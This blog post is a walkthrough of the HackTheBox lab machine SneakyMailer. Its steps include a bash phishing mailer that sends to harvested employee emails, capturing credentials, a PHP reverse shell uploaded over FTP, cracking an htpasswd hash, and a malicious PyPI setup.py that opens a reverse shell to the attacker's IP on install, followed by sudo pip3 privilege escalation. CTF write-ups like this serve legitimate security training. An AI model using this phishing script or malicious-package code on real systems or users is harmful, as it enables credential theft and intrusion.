---
title: SneakyMailer [HTB]
tags: [HackTheBox, Python]
image: /assets/images/sneakymailer/sneakymailer.png
published: true
banner: true
---

SneakyMailer is a Linux based machine that was active since July 11 of 2020 to --- , on this machine we will have to make a phising campain to get the credendials of a user, then using those credentials we will access to their smtp server and find other credentials on his sent messages, we will use those credentials to access to a ftp server where we will upload a reverse shell that we could access trough its webpage, after that we will find out that the machine has a pypiserver and that it install every package that is uploaded to it, so we will recover the password of the pypi server, generate a malicious pypi package and when we upload it we will get a shell as another user, this user can use pip3 as root without supplying a password, so we will abuse of this to get root on the machine.

# [](#header-1)Enumeration

We start using masscan to find all the available ports and then use nmap to get more information about them.

```
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.197
nmap -sC -sV -p 80,143,993,25,22,21,8080, -Pn -o scan.txt 10.10.10.197

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES ACL2=UNION ENABLE STARTTLS UTF8=ACCEPTA0001 CHILDREN OK ACL IMAP4rev1 NAMESPACE CAPABILITY QUOTA completed UIDPLUS THREAD=ORDEREDSUBJECT SORT IDLE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that there are some open ports, ftp which doesn't seem to allow anonymous login, some email related ports, such as smtp, imap and ssl/imap, and two webpages, one on port 80 and the other one on port 8080.
We start with the one on port 80, when we enter we are redirected to "http://sneakycorp.htb/" so we have to add that entry to our hosts file, since we have a domain probably the site contains some subdomains, but we will test that later, what wee see is a kind of dashboard of the company.

![](/assets/images/sneakymailer/website.png)

If we enter to "Team" we see a large list of employees with their emails.

![](/assets/images/sneakymailer/team.png)

## [](#header-2)Phishing Campaign

This is not something common on ctf boxes, but the image of the machine is a hint, we have to do a phishing campagin, the pagination is made on js but all the information is gotten on the first request, so we can get all the emails with a single request, so we request the page, grab the lines with "sneakymailer.htb", get rid of the html tags and save it to a file called maillist.txt, to do that we use the next commands: `curl http://sneakycorp.htb/team.php | grep "sneakymailer.htb" | cut -d ">" -f 2 | cut -d "<" -f 1 > maillist.txt`.
When you do a phising campaign you probably want to go for spear phishing or whaling, and you might want to make a "believable" phishing page, but ctfs are more about of practicing concepts rather than simulating real scenarios, so we don't have to build any webpage, python http.server will be enough, also we will flood all the emails with the same message.

Now that we have the list of emails we can send the messages, there are some tools to do that, but we will script something simple, `curl` can be used to send emails to smtp servers, first we will create a file called "mail.txt" which will contain the email, it just has to fulfill the basic email structure.
```
From: 5ubterranean@sneakymailer.htb
To: tigernixon@sneakymailer.htb
Subject: Your bank account

http://10.10.15.120/account/
```
Then we have to build the script that will send the email to all the emails on the list, we called it phish.sh.
```bash
#!/bin/bash
OLDMAIL='tigernixon@sneakymailer.htb'
while read p; do
	sed -i "s/${OLDMAIL}/${p}/" mail.txt
	curl smtp://sneakycorp.htb --mail-from 5ubterranean@sneakymailer.htb --mail-rcpt ${p} --upload-file mail.txt
	OLDMAIL=${p}
done <  maillist.txt
```
"tigernixon@sneakymailer.htb" is the first email on maillist.txt, that's why we are starting with it, so what the script does is: It reads every line on maillist.txt, changes the email inside "mail.txt" and sends it using curl to the target email, note that receiver changes in two places, actually there is no need of changing the email inside "mail.txt", but let's try to look more legitimate at least here.
Before running "phish.sh" we have to start our http server on port 80, `sudo python3 -m http.server 80` and also wireshark, once we have both running we can fire up the script, after waiting for a while we will see that our server gets a POST request.

![](/assets/images/sneakymailer/postgot.png)

But there is a problem, by default python http server doesn't support POST requests, that's why we needed wireshark, we filter for packets coming from the machine that used POST request: `ip.src == 10.10.10.197 && http.request.method == POST`

![](/assets/images/sneakymailer/wirepost.png)

We follow the http stream and see some credentials.

![](/assets/images/sneakymailer/phished.png)

The password is URL enconded, after decoding it we get that the email is "paulbyrd@sneakymailer.htb" and its password is "^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"

# [](#header-1)Gaining Access

Well we got some credentials, we can use them to login into the imap server and try to find useful information, we can connect to it using nc: `nc 10.10.10.197 143`

![](/assets/images/sneakymailer/mailssent.png)

Once we are connected we use "aa LOGIN paulbyrd ``^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"`` to login as the user, then we list all the availabe folders with `aa LIST "" "*"`, after that we check if "Sent Items" has any message, `aa STATUS "INBOX.Sent Items" (MESSAGES)` (all the other folders are empty), finally we select it and read the first message, `aa SELECT "INBOX.Sent Items"`, `aa FETCH 1 (BODY[1])`. There wee see that the user is asking for the password of an account to be changed, if we are lucky the password hasn't been changed yet.
We can use those creds to access to the ftp server, it only has "dev" folder and inside we can see the sourcecode of the webpage.

![](/assets/images/sneakymailer/ftp.png)

After testing it we find out that we can upload files in "dev" folder (but we can't upload on any subdirectory), so we upload a revershe shell (as always I use [pentestmonkey's php reverse shell](https://github.com/pentestmonkey/php-reverse-shell)), we named it "rev.php", but if we access to "http://sneakycorp.htb/rev.php" we get a not found page, so maybe the ftp is a place where a kind of backup code is stored, or maybe it is located at a subdomain, so we use [ffuf](https://github.com/ffuf/ffuf) to find subdomains, we should have run this on background while we were doing the previous steps, the command to do this is: `ffuf -u http://10.10.10.197 -H "Host: FUZZ.sneakycorp.htb" -w /usr/share/wordlists/dirb/common.txt --fs 185`

![](/assets/images/sneakymailer/ffuf.png)

We see that there is a "dev" subdomain, so we add it to our hosts file, the ftp server is cleaned every x seconds, so we will need to upload again our reverse shell, and when we access to "http://dev.sneakycorp.htb/rev.php" we get a shell.

![](/assets/images/sneakymailer/shell1.png)

# [](#header-1)Lateral Movement

Now that we are inside the machine we can enumerate more, we start checking the webpage, so we go to "/var/www" and see that there is a directory for every subdomain.

![](/assets/images/sneakymailer/www.png)

If we go to "http://pypi.sneakycorp.htb/" we are redirected to main subdomain, but we haven't checked port 8080, if we go to "http://pypi.sneakycorp.htb:8080/" we find a pypiserver (we might have also found this subdomain using ffuf).

![](/assets/images/sneakymailer/pypi.png)

As any pypiserver you can list the packages that it serves going to "/simple", but we are asked for credentials, and the ones that we have doesn't work, since we are in nginx we can find the hash of the credentials in .htpasswd file inside the corresponding directory.

![](/assets/images/sneakymailer/pycreds.png)

We save copy the hash locally and use john to crack it, we get that the password is "soufianeelhaoui".

![](/assets/images/sneakymailer/pypass.png)

Great we can now interact with pypiserver, but there isn't any package to download, and we can't use those creds inside the machine, so maybe we have to upload a package and something might happen... Well that's not very convincing but we have to try, the box has python2 and python3 installed so we have to find out which version is running the pypi server so we don't get any issue, we read the file "venv/pyvenv.cfg" and we see that it is using python3.

![](/assets/images/sneakymailer/pyver.png)

 Well the first thing that we have to do is generate a package, rather than reading the whole pypi documentation we can use a module that generate us a template of a package, so we run `pip3 install create_package`, and the run "python -m create_package" to generate the template.

![](/assets/images/sneakymailer/genpackage.png)

Now we have to create a file called ".pypirc" in our home directory, setting up a repository called "local" so we can upload our package to the target box rather than the main pypi server (please don't try to upload malicious packages to the oficial pypi server), the content of the file is the next one:

```
[distutils]
index-servers =
 local

[local]
repository=http://pypi.sneakycorp.htb:8080
username=pypi
password=soufianeelhaoui
```

Now we have a test package to upload, but before that we upload [pspy](https://github.com/DominicBreuker/pspy) to see if something happens when we upload the pacakge, once we have pspy running we go to the directory generated by create_package and execute `python3 setup.py sdist upload -r local` to upload the package, it uploads with no problems, and pspy catches the next stuff:

![](/assets/images/sneakymailer/pspy.png)

We can see that when we upload a package the machine installs the package, well that is something we can abuse, [here](https://github.com/sn0wfa11/evil_py) is an example of how to get a shell when someone install a package, as we see the reverse shell is put at the start of the "setup.py" file, we copy the start of the example but we put a reverse shell generated with [one-lin3r](https://github.com/D4Vinci/One-Lin3r). But the package is not ready yet, when we try to upload the package, setup.py is executed, so if we try to upload it we will get a shell to our machine before it uploads, and it won't upload, so we must add a check so the shell just gets executed out of our machine, I use parrot os, so I put an if condition that checks that uname doesn't contain the word "parrot", so the start of setup.py looks like this:

```python
import socket
import os
import subprocess
import setuptools
from setuptools.command.install import install

class shell(install):
	if str(os.uname()).find("parrot") == -1:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.120",54322));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

with open("README.md", "r") as fh:
    long_description = fh.read()
```

We upload our package again and we will get a shell as "low".

![](/assets/images/sneakymailer/shell2.png)

# [](#header-1)Privilege Escalation

We got user.txt, prvilege escalation is trivial, we see that we can run pip3 without supplying credentials, we search pip in [gtfobins](https://gtfobins.github.io/gtfobins/pip/#sudo) and we find a privilege escalation technique, it is for pip, but there is no difference with pip3, so we follow the steps and we are finished with the box.

![](/assets/images/sneakymailer/privesc.png)

# [](#header-1)Final Thoughts

Some lessons that we can learn are:
*   No matter how strongs you passwords are if someone tricks you to send him your credentials there is no point, if we recall the passwords of this machine (besides the one of pypi) were really strong, long, with all the characters and completely random, but we found them laying around.
*   Check what you allow to run as root, yes it can be annoying to write the password every time that you want to run something as root, but it is an important measure of protection.